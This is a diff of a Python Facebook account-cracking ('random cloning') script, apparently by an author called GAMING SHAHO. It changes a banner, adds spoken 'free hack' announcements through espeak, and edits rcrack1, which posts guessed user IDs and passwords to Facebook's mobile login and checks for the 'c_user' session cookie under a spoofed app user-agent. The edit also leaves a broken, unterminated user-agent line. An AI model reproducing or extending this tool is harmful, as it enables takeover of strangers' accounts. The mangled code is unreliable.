@@ -135,28 +135,29 @@ def fuckx():
 	ufff = "[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217850;[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/"+"{density=3.0,width=1080,height=1920}"+f";FBLC/en_US;FBRV/279865282;FBCR/Willkommen;FBMF/oppo;FBBD/oppo;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
 	return ufff
 #--------------------------(LOGO BOX)--------------------------#
-logo =("""
-
-
-<=================================================>
-       _____ _    _          _    _  ____        |
-      / ____| |  | |   /\   | |  | |/ __ \       |
-     | (___ | |__| |  /  \  | |__| | |  | |      |
-      \___ \|  __  | / /\ \ |  __  | |  | |      |
-      ____) | |  | |/ ____ \| |  | | |__| |      |
-     |_____/|_|  |_/_/    \_\_|  |_|\____/       |
-                                                 |
-<=================================================>                                      
-\x1b[38;5;46mâ‹†\x1b[38;5;254mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\x1b[38;5;50mâ‹†
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mOWNER     \033[1;31mâ— \x1b[38;5;46mGAMING SHAHO
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31mâ— \x1b[38;5;46mGAMING SHAHO
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m â— \x1b[38;5;46m1.2
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   â— \x1b[38;5;46mRandom Cloning
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    â— \x1b[38;5;46mPersonal
-\033[1;31m[\033[1;32m=\033[1;96m]  \x1b[38;5;46mwHATSAPP  \033[1;96mâ—\x1b[38;5;46m01951153459
-\x1b[38;5;50mâ‹†\x1b[38;5;254mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\x1b[38;5;50mâ‹†""")
-
-linex=('\x1b[38;5;46mâ‹†\x1b[38;5;254mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\x1b[38;5;50mâ‹†')   
+logo=(f"""
+  
+              _____ _    _          _    _  ____  
+             / ____| |  | |   /\   | |  | |/ __ \ 
+            | (___ | |__| |  /  \  | |__| | |  | |
+             \___ \|  __  | / /\ \ |  __  | |  | |
+             ____) | |  | |/ ____ \| |  | | |__| |
+            |_____/|_|  |_/_/    \_\_|  |_|\____/ 
+            
+<-------------------------------------------------------->
+| {G} OWNER:> GAMING SHAHO
+| {B} FACEBOOK PAGE :> GAMING SHAHO
+| {G} WHATSAPP :> 01951153459
+| {B} TOOL :> RANDOM
+| {G} STATUS :> FREE 
+<--------------------------------------------------------> """)
+os.system('espeak -a 300 "installing starting free hack "')
+os.system('espeak -a 300 "author GAMING SHAHO "')
+os.system('espeak -a 300 "Whatsapp 01951153459 "')
+os.system('espeak -a 300 "version 1.0 "')
+os.system('espeak -a 300 "from bangladesh "')
+os.system('espeak -a 300 "tool random bd "')
+os.system('espeak -a 300 "enjoy everyone "')
 #--------------------------(MENU BOX)--------------------------#
 class Main:
     def __init__(self):
@@ -258,9 +259,7 @@ def rcrack1(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
-}
+    'user-agent': 'ufff}
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
